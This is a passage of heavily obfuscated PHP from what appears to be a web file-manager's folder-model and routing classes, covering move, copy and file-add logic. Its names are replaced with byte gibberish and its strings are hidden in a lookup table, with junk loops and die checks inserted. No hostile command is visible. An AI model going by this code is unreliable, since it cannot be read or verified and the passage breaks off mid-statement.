$this->field($­ª¬ä¶»)->where($­¦ÙÖ…)->select(); if (!$Áœ‡İ°Õ) { return; } $Áœ‡İ°Õ = array_to_keyvalue($Áœ‡İ°Õ, $òîêÍ£€[194]); foreach ($Áœ‡İ°Õ as $­Ùò’Æ) { $Ã±‹ˆ„ = $­Ùò’Æ[$òîêÍ£€[193]]; $àŠ€‡ç“ = $­Ùò’Æ[$òîêÍ£€[194]]; if (!isset($this->_childrenListCache[$àŠ€‡ç“]) && $­Ùò’Æ[$òîêÍ£€[496]] == $òîêÍ£€[91]) { $this->_childrenListCache[$àŠ€‡ç“] = array(); } if (!isset($this->_childrenListCache[$Ã±‹ˆ„])) { $this->_childrenListCache[$Ã±‹ˆ„] = array(); } $this->_childrenListCache[$Ã±‹ˆ„][$àŠ€‡ç“] = $­Ùò’Æ; $this->_childrenItemCache[$àŠ€‡ç“] = $­Ùò’Æ; } } private function _childrenListAll($ë¯²‚™, &$ØË™“ô) { $÷½ÍÇ§¤ =& $_SERVER[®»±”ó²]; if (!isset($this->_childrenListCache[$ë¯²‚™])) { return; } $¾ÃÏÖ¥— = $this->_childrenListCache[$ë¯²‚™]; foreach ($¾ÃÏÖ¥— as $›ÏÙË´‹ => $‡Í”ù«ü) { $ØË™“ô[$›ÏÙË´‹] = $‡Í”ù«ü; if ($‡Í”ù«ü[$÷½ÍÇ§¤[496]] == $÷½ÍÇ§¤[91]) { $this->_childrenListAll($›ÏÙË´‹, $ØË™“ô); } } } private function sourceInfoCache($––ôåı½) { if (isset($this->_childrenItemCache[$––ôåı½])) { return $this->_childrenItemCache[$––ôåı½]; } return $this->sourceInfo($––ôåı½); } private function _childrenList($¢¬ı¨«—) { if (isset($this->_childrenListCache[$¢¬ı¨«—])) { return $this->_childrenListCache[$¢¬ı¨«—]; } return $this->_childrenListSelect($¢¬ı¨«—); } private function _childrenListSelect($ÂÜ‘œ€) { $çíâ¨ÁÆ =& $_SERVER[®»±”ó²]; $Ÿ”¼’Àõ = array($çíâ¨ÁÆ[193] => $ÂÜ‘œ€, $çíâ¨ÁÆ[516] => $this->targetIsDelete); $®ñ¸²šµ = $this->where($Ÿ”¼’Àõ)->select(); $®ñ¸²šµ = $®ñ¸²šµ ? $®ñ¸²šµ : array(); $İ üÅÈê = array_to_keyvalue($®ñ¸²šµ, $çíâ¨ÁÆ[194]); $this->_childrenListCache[$ÂÜ‘œ€] = $İ üÅÈê; foreach ($İ üÅÈê as $ÂÜ‘œ€ => $À¿¿êø) { $this->_childrenItemCache[$ÂÜ‘œ€] = $À¿¿êø; } return $İ üÅÈê; } private function fileNameExistAuto($Ü· ú¼·, $—ï³™ºÃ) { $êŠØÜÉÊ =& $_SERVER[®»±”ó²]; if ($—ï³™ºÃ[$êŠØÜÉÊ[516]] == $êŠØÜÉÊ[91]) { return $this->fileNameExist($Ü· ú¼·, $—ï³™ºÃ[$êŠØÜÉÊ[32]]); } return $this->fileNameExistCache($Ü· ú¼·, $—ï³™ºÃ[$êŠØÜÉÊ[32]]); } private function fileNameExistCache($‚Êã‡³“, $‘áÍ˜¹) { $êÜÎÛĞ¶ =& $_SERVER[®»±”ó²]; $‘áÍ˜¹ = strtolower($‘áÍ˜¹); $¯ôÔşÓ³ = $this->_childrenList($‚Êã‡³“); foreach ($¯ôÔşÓ³ as $ƒÔóµÅ†) { if ($‘áÍ˜¹ == strtolower($ƒÔóµÅ†[$êÜÎÛĞ¶[32]])) { return $ƒÔóµÅ†[$êÜÎÛĞ¶[194]]; } } return !1; } private function fileNameAutoCache($‹¥ÁÍ¶–, $ìÓµ¿˜Ä, $±ª¦ù¡, $ò¶½·İË) { $àì¨şìÆ =& $_SERVER[®»±”ó²]; $“£ÆÔœ” = $this->_childrenList($‹¥ÁÍ¶–); $µ¯Ì»Á¹ = array_to_keyvalue($“£ÆÔœ”, $àì¨şìÆ[12], $àì¨şìÆ[32]); return $this->fileNameAutoGet($µ¯Ì»Á¹, $ìÓµ¿˜Ä, $±ª¦ù¡, $ò¶½·İË); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($’ïäšÀï, $£Î£¥¢, $‚úšè¥° = REPEAT_REPLACE, $¥ŠµØÔ = '') { $€ò é†’ =& $_SERVER[®»±”ó²]; $äŸÏğ³ô = $this->sourceInfo($’ïäšÀï); $¡ÀÆş”õ = $this->sourceInfo($£Î£¥¢); if ($äŸÏğ³ô[$€ò é†’[193]] == $¡ÀÆş”õ[$€ò é†’[194]]) { if ($äŸÏğ³ô[$€ò é†’[516]] == $€ò é†’[91]) { Model($€ò é†’[514])->restore(array($’ïäšÀï)); } if (!$¥ŠµØÔ || $¥ŠµØÔ == $äŸÏğ³ô[$€ò é†’[32]]) { return $’ïäšÀï; } } $ö„Ò·½ = $this->pathInfoMore($’ïäšÀï); if ($this->isParentOf($’ïäšÀï, $£Î£¥¢)) { return !1; } if (!$äŸÏğ³ô || !$¡ÀÆş”õ || $¡ÀÆş”õ[$€ò é†’[496]] != $€ò é†’[91]) { return !1; } Hook::trigger($€ò é†’[674], $ö„Ò·½); $this->targetIsDelete = intval($äŸÏğ³ô[$€ò é†’[516]]); if ($äŸÏğ³ô[$€ò é†’[193]] == $£Î£¥¢ && $¥ŠµØÔ != $äŸÏğ³ô[$€ò é†’[32]]) { $ƒŒë‰ëÇ = $this->fileNameExist($£Î£¥¢, $¥ŠµØÔ); if ($ƒŒë‰ëÇ && $äŸÏğ³ô[$€ò é†’[496]] == $€ò é†’[231]) { $ÇÂİğÕÉ = $this->sourceInfo($ƒŒë‰ëÇ); $›àİ›Ûö = $this->fileHistory($ÇÂİğÕÉ, $äŸÏğ³ô[$€ò é†’[554]], $äŸÏğ³ô[$€ò é†’[79]]); if (!$›àİ›Ûö) { Model($€ò é†’[557])->remove($äŸÏğ³ô[$€ò é†’[554]]); } $this->removeNow($’ïäšÀï, !1); $this->folderSizeReset($£Î£¥¢); Hook::trigger($€ò é†’[675], $ö„Ò·½); return $ƒŒë‰ëÇ; } } $Î­äîŞ” = $¥ŠµØÔ ? $¥ŠµØÔ : $äŸÏğ³ô[$€ò é†’[32]]; $this->lockMoveStart($’ïäšÀï); $this->lockWriteStart($£Î£¥¢, $Î­äîŞ”); $÷œåóµ¬ = array($€ò é†’[645] => array(), $€ò é†’[676] => !1); $this->clearShare($’ïäšÀï, $£Î£¥¢); $ş¯ÏçİÛ = $this->fileNameExistAuto($£Î£¥¢, $äŸÏğ³ô); $´Œ°¼Íô = $this->_move($’ïäšÀï, $£Î£¥¢, $‚úšè¥°, $÷œåóµ¬, $¥ŠµØÔ); $this->sourceCacheClear(); if ($äŸÏğ³ô[$€ò é†’[496]] == $€ò é†’[91] && $ş¯ÏçİÛ) { $this->folderSizeResetChildren($´Œ°¼Íô); } Model($€ò é†’[233])->linkAdd($÷œåóµ¬[$€ò é†’[645]]); if ($´Œ°¼Íô && $ş¯ÏçİÛ && $÷œåóµ¬[$€ò é†’[676]]) { $îÑßÈ—ş = $äŸÏğ³ô[$€ò é†’[496]] == $€ò é†’[91] ? $this->_childrenListSelect($’ïäšÀï) : !1; $«ƒÄä»Ê = $îÑßÈ—ş && count($îÑßÈ—ş) > 0 ? !0 : !1; $this->removeNow($’ïäšÀï, $«ƒÄä»Ê); } $this->lockMoveEnd($’ïäšÀï); $this->lockWriteEnd($£Î£¥¢, $Î­äîŞ”); $this->folderSizeReset($äŸÏğ³ô[$€ò é†’[193]]); $this->folderSizeReset($£Î£¥¢); $í¿•¨ = array($äŸÏğ³ô[$€ò é†’[193]], $£Î£¥¢); if ($äŸÏğ³ô[$€ò é†’[496]] == $€ò é†’[91]) { $í¿•¨[] = $’ïäšÀï; } $this->updateModifyTime($í¿•¨); Model($€ò é†’[649])->eventMove($’ïäšÀï, $äŸÏğ³ô[$€ò é†’[193]], $£Î£¥¢); Hook::trigger($€ò é†’[675], $ö„Ò·½); return $´Œ°¼Íô; } private function _move($´šúĞ«, $æõ½‚­, $Š®‡¨Ò», &$šœúÊù, $ú­©Æ¼ì = '') { $…» ’ê =& $_SERVER[®»±”ó²]; $ğêËƒ” = $this->sourceInfo($´šúĞ«); $·ê€±ß = $ğêËƒ”[$…» ’ê[496]] == $…» ’ê[91]; $Œá¢–Ö = $ú­©Æ¼ì ? $ú­©Æ¼ì : $ğêËƒ”[$…» ’ê[32]]; $Ìò©¡¶ñ = $this->fileNameExistAuto($æõ½‚­, $ğêËƒ”); $this->lockMoveStart($´šúĞ«); $this->lockWriteStart($æõ½‚­, $Œá¢–Ö); if (!$Ìò©¡¶ñ) { return $this->_moveForce($´šúĞ«, $æõ½‚­, $Œá¢–Ö); } $ù–È®ÁĞ = $Ìò©¡¶ñ; $Éá®³Ù’ = !1; if ($·ê€±ß) { if ($Š®‡¨Ò» == REPEAT_RENAME_FOLDER) { $Œá¢–Ö = $this->fileNameAuto($æõ½‚­, $Œá¢–Ö, $Š®‡¨Ò», $·ê€±ß); $ù–È®ÁĞ = $this->_moveForce($´šúĞ«, $æõ½‚­, $Œá¢–Ö); } else { $¶ñ¶Ãª = $this->_childrenListSelect($´šúĞ«); foreach ($¶ñ¶Ãª as $à…ğÖ ´) { $£¦»–¦ = REPEAT_REPLACE; $this->_move($à…ğÖ ´[$…» ’ê[194]], $Ìò©¡¶ñ, $£¦»–¦, $šœúÊù); } $Éá®³Ù’ = !0; } } else { if ($Š®‡¨Ò» == REPEAT_RENAME || $Š®‡¨Ò» == REPEAT_RENAME_FOLDER) { $Œá¢–Ö = $this->fileNameAuto($æõ½‚­, $Œá¢–Ö, $Š®‡¨Ò», $·ê€±ß); $ù–È®ÁĞ = $this->_moveForce($´šúĞ«, $æõ½‚­, $Œá¢–Ö); } else { $À›ŸÂ—ê = $this->sourceInfoCache($Ìò©¡¶ñ); $µğÁÖ¸ = $this->fileHistory($À›ŸÂ—ê, $ğêËƒ”[$…» ’ê[554]], $ğêËƒ”[$…» ’ê[79]]); if ($µğÁÖ¸) { $šœúÊù[$…» ’ê[645]][] = $ğêËƒ”[$…» ’ê[554]]; } $Éá®³Ù’ = !0; } } if ($Éá®³Ù’) { $šœúÊù[$…» ’ê[676]] = !0; } return $ù–È®ÁĞ; } private function _moveForce($¦Š¥ÜÑ³, $„¤†©îå, $îúœæş) { $±¢ıÊ¶œ =& $_SERVER[®»±”ó²]; $¢êëß’Œ = $this->sourceInfo($¦Š¥ÜÑ³); $ˆşĞ øŒ = $this->sourceInfo($„¤†©îå); $Ş´„Óšà = $¢êëß’Œ[$±¢ıÊ¶œ[496]] == $±¢ıÊ¶œ[91]; $ÈèØ÷Â = array($±¢ıÊ¶œ[488] => $ˆşĞ øŒ[$±¢ıÊ¶œ[194]], $±¢ıÊ¶œ[668] => $ˆşĞ øŒ[$±¢ıÊ¶œ[597]] . $ˆşĞ øŒ[$±¢ıÊ¶œ[194]] . $±¢ıÊ¶œ[50], $±¢ıÊ¶œ[664] => $ˆşĞ øŒ[$±¢ıÊ¶œ[191]], $±¢ıÊ¶œ[665] => $ˆşĞ øŒ[$±¢ıÊ¶œ[582]], $±¢ıÊ¶œ[667] => USER_ID, $±¢ıÊ¶œ[505] => $îúœæş); $®Ú“âÒ = $¢êëß’Œ[$±¢ıÊ¶œ[191]] == SourceModel::TYPE_GROUP && $ˆşĞ øŒ[$±¢ıÊ¶œ[191]] == SourceModel::TYPE_GROUP && $¢êëß’Œ[$±¢ıÊ¶œ[582]] == $ˆşĞ øŒ[$±¢ıÊ¶œ[582]]; if (!$®Ú“âÒ && $this->moveClearAuth) { Model($±¢ıÊ¶œ[580])->authClear($¦Š¥ÜÑ³); } $„à¨¬®¯ = $¢êëß’Œ[$±¢ıÊ¶œ[516]] == $±¢ıÊ¶œ[91] && $ˆşĞ øŒ[$±¢ıÊ¶œ[516]] != $±¢ıÊ¶œ[91]; if ($„à¨¬®¯) { $ÈèØ÷Â[$±¢ıÊ¶œ[515]] = 0; } if ($Ş´„Óšà) { $È£Áİ¾ = array($±¢ıÊ¶œ[668] => array($±¢ıÊ¶œ[628], $¢êëß’Œ[$±¢ıÊ¶œ[597]] . $¢êëß’Œ[$±¢ıÊ¶œ[194]] . $±¢ıÊ¶œ[629])); $èµ´¥ÍÉ = $¢êëß’Œ[$±¢ıÊ¶œ[597]] . $¢êëß’Œ[$±¢ıÊ¶œ[194]] . $±¢ıÊ¶œ[50]; $‹„– = $ˆşĞ øŒ[$±¢ıÊ¶œ[597]] . $ˆşĞ øŒ[$±¢ıÊ¶œ[194]] . $±¢ıÊ¶œ[50] . $¢êëß’Œ[$±¢ıÊ¶œ[194]] . $±¢ıÊ¶œ[50]; $±ñä×Ÿ = array($±¢ıÊ¶œ[668] => array($±¢ıÊ¶œ[677], "\162\145\x70\x6c\x61\x63\145\50\160\x61\162\x65\156\x74\114\145\166\x65\154\x2c\47{$èµ´¥ÍÉ}\47\54\x27{$‹„–}\47\51"), $±¢ıÊ¶œ[664] => $ˆşĞ øŒ[$±¢ıÊ¶œ[191]], $±¢ıÊ¶œ[665] => $ˆşĞ øŒ[$±¢ıÊ¶œ[582]]); if ($„à¨¬®¯) { $±ñä×Ÿ[$±¢ıÊ¶œ[515]] = 0; } $this->where($È£Áİ¾)->data($±ñä×Ÿ)->save(); } $this->where(array($±¢ıÊ¶œ[502] => $¦Š¥ÜÑ³))->data($ÈèØ÷Â)->save(); return $¦Š¥ÜÑ³; } private function clearShare($š§Ò®ï½, $åˆù•å”) { $Ğâ“µ¿‡ =& $_SERVER[®»±”ó²]; $¿ŸÇ’¦– = $this->sourceInfo($š§Ò®ï½); $»´Şæó¹ = $this->sourceInfo($åˆù•å”); if ($¿ŸÇ’¦–[$Ğâ“µ¿‡[582]] == $»´Şæó¹[$Ğâ“µ¿‡[582]] && $¿ŸÇ’¦–[$Ğâ“µ¿‡[191]] == $Ğâ“µ¿‡[678]) { return; } $»„¥µÏÊ = array($Ğâ“µ¿‡[597] => array($Ğâ“µ¿‡[628], $¿ŸÇ’¦–[$Ğâ“µ¿‡[597]] . $š§Ò®ï½ . $Ğâ“µ¿‡[629])); $Ãğ•ŠÍ  = $this->field($Ğâ“µ¿‡[502])->where($»„¥µÏÊ)->getField($Ğâ“µ¿‡[194], !0); if (!$Ãğ•ŠÍ ) { return; } $»„¥µÏÊ = array($Ğâ“µ¿‡[194] => array($Ğâ“µ¿‡[7], $Ãğ•ŠÍ ), $Ğâ“µ¿‡[679] => 1); $²º´…¸© = Model($Ğâ“µ¿‡[680])->field($Ğâ“µ¿‡[681])->where($»„¥µÏÊ)->select(); if (!$²º´…¸©) { return; } $²º´…¸© = array_to_keyvalue($²º´…¸©, $Ğâ“µ¿‡[12], $Ğâ“µ¿‡[681]); $»„¥µÏÊ = array($Ğâ“µ¿‡[681] => array($Ğâ“µ¿‡[7], $²º´…¸©)); Model($Ğâ“µ¿‡[680])->where($»„¥µÏÊ)->save(array($Ğâ“µ¿‡[679] => 0)); Model($Ğâ“µ¿‡[682])->where($»„¥µÏÊ)->delete(); } public function copyFolderFromIO($­¤®¨ˆë, $ó¿»÷øü, $ŠâØÇ, $ˆ‹õ§’é, $¢éô û±, $œœ®š˜ö = false) { $ÕÖÂÈ« =& $_SERVER[®»±”ó²]; $ç›­ÍÚ = array($ÕÖÂÈ«[646] => array(), $ÕÖÂÈ«[647] => array(), $ÕÖÂÈ«[645] => array(), $ÕÖÂÈ«[683] => array()); $€Æ Ìß‚ = $œœ®š˜ö ? $œœ®š˜ö : $­¤®¨ˆë->pathThis($ó¿»÷øü); $¤­Ï” = $this->fileNameExist($ŠâØÇ, $€Æ Ìß‚); $¯À‰ƒ• = $this->mkdir($ŠâØÇ, $€Æ Ìß‚, $ˆ‹õ§’é); if (!$¤­Ï” || $ˆ‹õ§’é == REPEAT_RENAME_FOLDER) { $ˆ‹õ§’é = !1; } if ($¤­Ï”) { $this->_childrenAllMake($¤­Ï”); } Hook::trigger($ÕÖÂÈ«[684]); $‡¹ê‘Úµ = KodIO::ioFileDriverGet($ÕÖÂÈ«[494] . $ŠâØÇ . $ÕÖÂÈ«[404]); $this->_copyChildTo($­¤®¨ˆë, $ó¿»÷øü, $¯À‰ƒ•, $ˆ‹õ§’é, $ç›­ÍÚ, $¢éô û±, $‡¹ê‘Úµ); Hook::trigger($ÕÖÂÈ«[685]); if ($¯À‰ƒ•) { $this->folderSizeResetChildren($¯À‰ƒ•); } $this->_childrenListClear(); Model($ÕÖÂÈ«[648])->addAll($ç›­ÍÚ[$ÕÖÂÈ«[646]], array(), !0); Model($ÕÖÂÈ«[649])->eventCopy($¯À‰ƒ•); $this->saveAll($ç›­ÍÚ[$ÕÖÂÈ«[647]]); Model($ÕÖÂÈ«[557])->linkAdd($ç›­ÍÚ[$ÕÖÂÈ«[645]]); Model($ÕÖÂÈ«[557])->remove($ç›­ÍÚ[$ÕÖÂÈ«[683]]); $this->folderSizeReset($ŠâØÇ); $this->updateModifyTime($ŠâØÇ); return $¯À‰ƒ•; } private function _copyChildTo($®î§®, $”¨ğúò, $»¸ÇÀÛ›, $Å¢şòÔ, &$­Ÿààë‘, $æãæ©Ûã, $–Á…Ûö‚) { $”Ú± =& $_SERVER[®»±”ó²]; $€Ü”ÒØ = $this->sourceInfoCache($»¸ÇÀÛ›); $£³±¨»Ì = $®î§®->listPath($”¨ğúò); $£³±¨»Ì = $£³±¨»Ì ? $£³±¨»Ì : array($”Ú±[86] => array(), $”Ú±[85] => array()); $¡‚¹šÕ• = array_merge($£³±¨»Ì[$”Ú±[86]], $£³±¨»Ì[$”Ú±[85]]); $—”ÈùïÎ = $this->_addFiles($®î§®, $–Á…Ûö‚, $£³±¨»Ì[$”Ú±[86]], $æãæ©Ûã); $ºÊ¬¬ÏÄ = array(); foreach ($¡‚¹šÕ• as &$¹ªş±š«) { if (isset($—”ÈùïÎ[$¹ªş±š«[$”Ú±[32]]])) { $¹ªş±š« = $—”ÈùïÎ[$¹ªş±š«[$”Ú±[32]]]; } $¹ªş±š«[$”Ú±[496]] = $¹ªş±š«[$”Ú±[33]] == $”Ú±[78]; $¹ªş±š«[$”Ú±[497]] = substr(_get($¹ªş±š«, $”Ú±[169], $”Ú±[12]), 0, 10); $¹ªş±š«[$”Ú±[79]] = _get($¹ªş±š«, $”Ú±[79], 0); $¹ªş±š«[$”Ú±[554]] = _get($¹ªş±š«, $”Ú±[554], 0); if (!isset($¹ªş±š«[$”Ú±[686]]) && $¹ªş±š«[$”Ú±[554]]) { $­Ÿààë‘[$”Ú±[683]][] = $¹ªş±š«[$”Ú±[554]]; } if ($Å¢şòÔ) { $½…èÌ…” = $this->fileNameExistCache($»¸ÇÀÛ›, $¹ªş±š«[$”Ú±[32]]); if ($½…èÌ…”) { if ($¹ªş±š«[$”Ú±[496]] || $Å¢şòÔ == REPEAT_SKIP) { continue; } if ($Å¢şòÔ == REPEAT_REPLACE) { $Äí°¼¶ = $this->sourceInfoCache($½…èÌ…”); $Õ‹ò‰ç¡ = $this->fileHistory($Äí°¼¶, $¹ªş±š«[$”Ú±[554]], $¹ªş±š«[$”Ú±[79]]); if ($Õ‹ò‰ç¡) { $­Ÿààë‘[$”Ú±[645]][] = $¹ªş±š«[$”Ú±[554]]; } continue; } else { if ($Å¢şòÔ == REPEAT_RENAME) { $¹ªş±š«[$”Ú±[32]] = $this->fileNameAutoCache($»¸ÇÀÛ›, $¹ªş±š«[$”Ú±[32]], $Å¢şòÔ, !1); } } } } if (!$¹ªş±š«[$”Ú±[496]] && $¹ªş±š«[$”Ú±[554]] == 0) { continue; } if (!$¹ªş±š«[$”Ú±[496]] && $¹ªş±š«[$”Ú±[554]]) { $­Ÿààë‘[$”Ú±[645]][] = $¹ªş±š«[$”Ú±[554]]; } $ºÊ¬¬ÏÄ[] = $this->_makeItemData($¹ªş±š«, $€Ü”ÒØ, $¹ªş±š«[$”Ú±[32]]); } unset($¹ªş±š«); if (!empty($ºÊ¬¬ÏÄ)) { $this->addAll($ºÊ¬¬ÏÄ); $this->_childrenListSelect($»¸ÇÀÛ›); } $ÓŸÆúÉË = $this->_childrenList($»¸ÇÀÛ›); $ÓŸÆúÉË = array_to_keyvalue($ÓŸÆúÉË, $”Ú±[32]); foreach ($¡‚¹šÕ• as $¹ªş±š«) { $Äí°¼¶ = $ÓŸÆúÉË[$¹ªş±š«[$”Ú±[32]]]; $™ıæÄ«¯ = $Äí°¼¶[$”Ú±[194]]; $this->_copyApplyMeta($Äí°¼¶, $­Ÿààë‘); if ($¹ªş±š«[$”Ú±[33]] == $”Ú±[78]) { $¹ªş±š«[$”Ú±[87]] = $®î§®->getPathInner($¹ªş±š«[$”Ú±[87]]); $this->_copyChildTo($®î§®, $¹ªş±š«[$”Ú±[87]], $™ıæÄ«¯, $Å¢şòÔ, $­Ÿààë‘, $æãæ©Ûã, $–Á…Ûö‚); } } } private function _addFiles($¬ÏŠÚöä, $×™õäÛ, $Åã§ûÛÊ, $¿çÀÜ‹À) { $¹ÃÀ†€œ =& $_SERVER[®»±”ó²]; if (!$Åã§ûÛÊ || count($Åã§ûÛÊ) == 0) { return array(); } $âçëŠƒ = array(); foreach ($Åã§ûÛÊ as &$û÷Õ«¾¼) { Hook::trigger($¹ÃÀ†€œ[687], $û÷Õ«¾¼); $û÷Õ«¾¼[$¹ÃÀ†€œ[87]] = $¬ÏŠÚöä->getPathInner($û÷Õ«¾¼[$¹ÃÀ†€œ[87]]); $€™¼Û©Ï = $¬ÏŠÚöä->hashSimple($û÷Õ«¾¼[$¹ÃÀ†€œ[87]]); $†°ã£® = $¬ÏŠÚöä->hashMd5($û÷Õ«¾¼[$¹ÃÀ†€œ[87]]); if (strlen($†°ã£®) > 10 && !isset($âçëŠƒ[$†°ã£®])) { $âçëŠƒ[$†°ã£®] = array(); } $û÷Õ«¾¼[$¹ÃÀ†€œ[688]] = $€™¼Û©Ï; $û÷Õ«¾¼[$¹ÃÀ†€œ[560]] = $†°ã£®; $âçëŠƒ[$†°ã£®][] =& $û÷Õ«¾¼; if (count($âçëŠƒ[$†°ã£®]) > 1) { $û÷Õ«¾¼[$¹ÃÀ†€œ[686]] = !0; } Hook::trigger($¹ÃÀ†€œ[689], $û÷Õ«¾¼); } unset($û÷Õ«¾¼); $×®ƒ•¼ù = array($¹ÃÀ†€œ[560] => array($¹ÃÀ†€œ[7], array_keys($âçëŠƒ))); $‘´º¼î¿ = Model($¹ÃÀ†€œ[690]); $”üÙ†¹‰ = $‘´º¼î¿->where($×®ƒ•¼ù)->select(); $”üÙ†¹‰ = $”üÙ†¹‰ ? $”üÙ†¹‰ : array(); foreach ($”üÙ†¹‰ as $‡µËé«©) { if (!isset($âçëŠƒ[$‡µËé«©[$¹ÃÀ†€œ[560]]])) { continue; } $İÎå¸±Ù = $âçëŠƒ[$‡µËé«©[$¹ÃÀ†€œ[560]]]; foreach ($İÎå¸±Ù as &$û÷Õ«¾¼) { $û÷Õ«¾¼[$¹ÃÀ†€œ[554]] = $‡µËé«©[$¹ÃÀ†€œ[554]]; $û÷Õ«¾¼[$¹ÃÀ†€œ[686]] = !0; } unset($û÷Õ«¾¼); } $‡¹Ş­ = array(); foreach ($Åã§ûÛÊ as $ì ó­Ò) { Hook::trigger($¹ÃÀ†€œ[691], $ì ó­Ò); if (isset($ì ó­Ò[$¹ÃÀ†€œ[686]]) && $ì ó­Ò[$¹ÃÀ†€œ[686]]) { Hook::trigger($¹ÃÀ†€œ[692], $ì ó­Ò); continue; } $îçÅÑ‡Ú = $¬ÏŠÚöä->getPathInner($ì ó­Ò[$¹ÃÀ†€œ[87]]); $Û”Ú÷Ë = $‘´º¼î¿->addFileMake($îçÅÑ‡Ú, $×™õäÛ, $ì ó­Ò[$¹ÃÀ†€œ[79]], $ì ó­Ò[$¹ÃÀ†€œ[688]], $ì ó­Ò[$¹ÃÀ†€œ[560]], $ì ó­Ò[$¹ÃÀ†€œ[32]], $¿çÀÜ‹À); Hook::trigger($¹ÃÀ†€œ[692], $ì ó­Ò); if (!is_array($Û”Ú÷Ë)) { continue; } $‡¹Ş­[] = $Û”Ú÷Ë; } $‘´º¼î¿->addAll($‡¹Ş­); $×®ƒ•¼ù = array($¹ÃÀ†€œ[560] => array($¹ÃÀ†€œ[7], array_keys($âçëŠƒ))); $”üÙ†¹‰ = $‘´º¼î¿->where($×®ƒ•¼ù)->select(); $”üÙ†¹‰ = $”üÙ†¹‰ ? $”üÙ†¹‰ : array(); foreach ($”üÙ†¹‰ as $‡µËé«©) { if (!isset($âçëŠƒ[$‡µËé«©[$¹ÃÀ†€œ[560]]])) { continue; } $”•ä±±Ó =& $âçëŠƒ[$‡µËé«©[$¹ÃÀ†€œ[560]]]; foreach ($”•ä±±Ó as &$û÷Õ«¾¼) { $û÷Õ«¾¼[$¹ÃÀ†€œ[554]] = $‡µËé«©[$¹ÃÀ†€œ[554]]; } unset($û÷Õ«¾¼); } $•­áàÛÄ = array(); foreach ($Åã§ûÛÊ as $ß±†Ã) { $•­áàÛÄ[$ß±†Ã[$¹ÃÀ†€œ[32]]] = $ß±†Ã; } return $•­áàÛÄ; } } define($_SERVER[®»±”ó²][693], $_SERVER[®»±”ó²][694]); goto F—â˜Ú’Š; F«¬É³êã³: $pzuqyhfbmw = $_SERVER[®»±”ó²][699]; if (strlen($pzuqyhfbmw) < $_SERVER[®»±”ó²][700]) { die; } class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\151\x6e\144\145\x78"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($Ã„ª¯à¤) { $½ß˜¤Ææ =& $_SERVER[®»±”ó²]; $¤³å¹‹é =& $_SERVER[öï™ ‘]; $ü•²«€² = explode($¤³å¹‹é[0], trim($Ã„ª¯à¤, $¤³å¹‹é[0])); $áó®©Ç = $½ß˜¤Ææ[701]; while ($áó®©Ç < $½ß˜¤Ææ[696]) { if ($áó®©Ç >= 0) { break; } $áó®©Ç++; } $this->defaultModule = $ü•²«€²[0] ? $ü•²«€²[0] : $this->defaultModule; $°Üì—¶• = $½ß˜¤Ææ[702]; while (strlen($°Üì—¶•) < $½ß˜¤Ææ[700]) { if (!$°Üì—¶•) { break; } $°Üì—¶•++; } $this->defaultController = $ü•²«€²[1] ? $ü•²«€²[1] : $this->defaultController; $this->defaultAction = $ü•²«€²[2] ? $ü•²«€²[2] : $this->defaultAction; $ûŠëëò³ = $½ß˜¤Ææ[703]; if (!$ûŠëëò³) { die; } $this->hjxtb3c3afde($¤³å¹‹é[1], array($this, $¤³å¹‹é[2])); } public function appRun($µõ¹ñ£¨) { $¬¢£íô– =& $_SERVER[®»±”ó²]; $ö¢ğÓû  =& $_SERVER[öï™ ‘]; $–µƒÀ‘– = explode($ö¢ğÓû [0], $µõ¹ñ£¨); $š¸‡…ø˜ = $¬¢£íô–[704]; $ÛÎàÕŠ™ = strtolower($–µƒÀ‘–[0]); $ë°ˆ«Ù– = $ö¢ğÓû [3]; $˜Öş Ÿğ = $¬¢£íô–[705]; if (strlen($˜Öş Ÿğ) < $¬¢£íô–[706]) { die; } if ($ÛÎàÕŠ™ == $ö¢ğÓû [4]) { $ë°ˆ«Ù– = $ö¢ğÓû [5]; $–µƒÀ‘–[0] = $ö¢ğÓû [6]; $–µƒÀ‘–[1] = $–µƒÀ‘–[1] . $ö¢ğÓû [7]; $µõ¹ñ£¨ = join($ö¢ğÓû [0], $–µƒÀ‘–); $µõ¹ñ£¨ = trim($µõ¹ñ£¨, $ö¢ğÓû [0]); } call_user_func(array($ö¢ğÓû [8], $ö¢ğÓû [9]), $ë°ˆ«Ù– . $ö¢ğÓû [10], $µõ¹ñ£¨); ActionCall($µõ¹ñ£¨); $»ŒÎ’öö = $¬¢£íô–[707]; if (!$»ŒÎ’öö) { die; } call_user_func(array($ö¢ğÓû [8], $ö¢ğÓû [9]), $ë°ˆ«Ù– . $ö¢ğÓû [11], $µõ¹ñ£¨); } private function autorun() { $ÍÂ¼ÛŒ¨ =& $_SERVER[®»±”ó²]; $í¼ç±ÓÊ =& $_SERVER[öï™ ‘]; global $config; $îâ§ˆéœ = $ÍÂ¼ÛŒ¨[708]; if (count($config[$í¼ç±ÓÊ[12]]) == 0) { return; } foreach ($config[$í¼ç±ÓÊ[12]] as $Ü¦¦Äº => $…æúõ±÷) { $this->appRun($…æúõ±÷); $ú¡ˆà˜ = $ÍÂ¼ÛŒ¨[709]; while ($ú¡ˆà˜ < $ÍÂ¼ÛŒ¨[700]) { if ($ú¡ˆà˜ >= 0) { break; } $ú¡ˆà˜++; } } } private function vfrl4c0d4440() { $İÉ¨ç°é =& $_SERVER[®»±”ó²]; $ÔÑ°‘‹¬ =& $_SERVER[öï™ ‘]; $ª¡ÆŞ¯ù = $ÔÑ°‘‹¬[4]; $õ­Êïê¸ = $İÉ¨ç°é[710]; while ($õ­Êïê¸ < $İÉ¨ç°é[483]) { if ($õ­Êïê¸ >= 0) { break; } $õ­Êïê¸++; } $ıÜ´¬ú = $GLOBALS[$ÔÑ°‘‹¬[13]][$ÔÑ°‘‹¬[14]][0]; $ıÃú Ç = $İÉ¨ç°é[711]; if (strlen($ıÃú Ç) < $İÉ¨ç°é[700]) { die; } if (!$ıÜ´¬ú || strlen($ıÜ´¬ú) <= strlen($ª¡ÆŞ¯ù)) { return; } if (strtolower(substr($ıÜ´¬ú, -strlen($ª¡ÆŞ¯ù))) != $ª¡ÆŞ¯ù) { return; } $‰˜›š§½ = substr($ıÜ´¬ú, 0, -strlen($ª¡ÆŞ¯ù)); $ë©ó—¼ = $İÉ¨ç°é[712]; while ($ë©ó—¼ < $İÉ¨ç°é[696]) { if ($ë©ó—¼ >= 0) { break; } $ë©ó—¼++; } $İÜöÑØé = 